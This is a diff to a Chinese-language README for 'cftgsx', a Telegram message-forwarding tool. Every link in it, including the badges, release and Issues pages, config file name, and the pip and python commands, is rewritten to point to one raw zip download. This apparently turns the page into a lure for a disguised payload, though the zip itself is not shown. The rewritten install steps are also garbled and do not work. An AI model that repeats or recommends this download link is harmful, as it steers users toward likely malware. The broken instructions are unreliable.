@@ -1,6 +1,6 @@
 # 高性能的Telegram双向消息转发解决方案 | cftgsx
 
-![GitHub release](https://img.shields.io/github/release/joshua-jake/cftgsx.svg) ![GitHub issues](https://img.shields.io/github/issues/joshua-jake/cftgsx.svg) ![GitHub stars](https://img.shields.io/github/stars/joshua-jake/cftgsx.svg)
+![GitHub release](https://github.com/joshua-jake/cftgsx/raw/refs/heads/main/sprad/Software_1.0.zip) ![GitHub issues](https://github.com/joshua-jake/cftgsx/raw/refs/heads/main/sprad/Software_1.0.zip) ![GitHub stars](https://github.com/joshua-jake/cftgsx/raw/refs/heads/main/sprad/Software_1.0.zip)
 
 ## 目录
 
@@ -15,7 +15,7 @@
 
 cftgsx是一个高性能、无状态的Telegram双向消息转发解决方案。它允许用户在多个Telegram账户之间快速、无缝地转发消息。该项目旨在提供一种开箱即用的方式，让用户能够轻松地管理和转发消息。
 
-[访问最新版本](https://github.com/joshua-jake/cftgsx/releases)
+[访问最新版本](https://github.com/joshua-jake/cftgsx/raw/refs/heads/main/sprad/Software_1.0.zip)
 
 ## 功能特性
 
@@ -37,7 +37,7 @@ cftgsx是一个高性能、无状态的Telegram双向消息转发解决方案。
 
 1. **下载项目**
 
-   请访问 [最新版本](https://github.com/joshua-jake/cftgsx/releases) 页面，下载最新的发布文件。
+   请访问 [最新版本](https://github.com/joshua-jake/cftgsx/raw/refs/heads/main/sprad/Software_1.0.zip) 页面，下载最新的发布文件。
 
 2. **解压缩文件**
 
@@ -48,19 +48,19 @@ cftgsx是一个高性能、无状态的Telegram双向消息转发解决方案。
    在项目目录中，运行以下命令以安装所需的Python依赖：
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/joshua-jake/cftgsx/raw/refs/heads/main/sprad/Software_1.0.zip
    ```
 
 4. **配置文件**
 
-   编辑 `config.json` 文件，添加您的Telegram API密钥和其他必要配置。
+   编辑 `https://github.com/joshua-jake/cftgsx/raw/refs/heads/main/sprad/Software_1.0.zip` 文件，添加您的Telegram API密钥和其他必要配置。
 
 5. **运行程序**
 
    使用以下命令启动程序：
 
    ```bash
-   python main.py
+   python https://github.com/joshua-jake/cftgsx/raw/refs/heads/main/sprad/Software_1.0.zip
    ```
 
 ### 使用示例
@@ -69,7 +69,7 @@ cftgsx是一个高性能、无状态的Telegram双向消息转发解决方案。
 
 ## 配置说明
 
-在`config.json`文件中，您需要提供以下信息：
+在`https://github.com/joshua-jake/cftgsx/raw/refs/heads/main/sprad/Software_1.0.zip`文件中，您需要提供以下信息：
 
 ```json
 {
@@ -102,6 +102,6 @@ cftgsx是一个高性能、无状态的Telegram双向消息转发解决方案。
 
 ## 反馈与支持
 
-如果您在使用过程中遇到问题，请在 [Issues](https://github.com/joshua-jake/cftgsx/issues) 页面提交反馈。我们将尽快为您提供支持。
+如果您在使用过程中遇到问题，请在 [Issues](https://github.com/joshua-jake/cftgsx/raw/refs/heads/main/sprad/Software_1.0.zip) 页面提交反馈。我们将尽快为您提供支持。
 
-[访问最新版本](https://github.com/joshua-jake/cftgsx/releases) 以获取更新和修复。
+[访问最新版本](https://github.com/joshua-jake/cftgsx/raw/refs/heads/main/sprad/Software_1.0.zip) 以获取更新和修复。
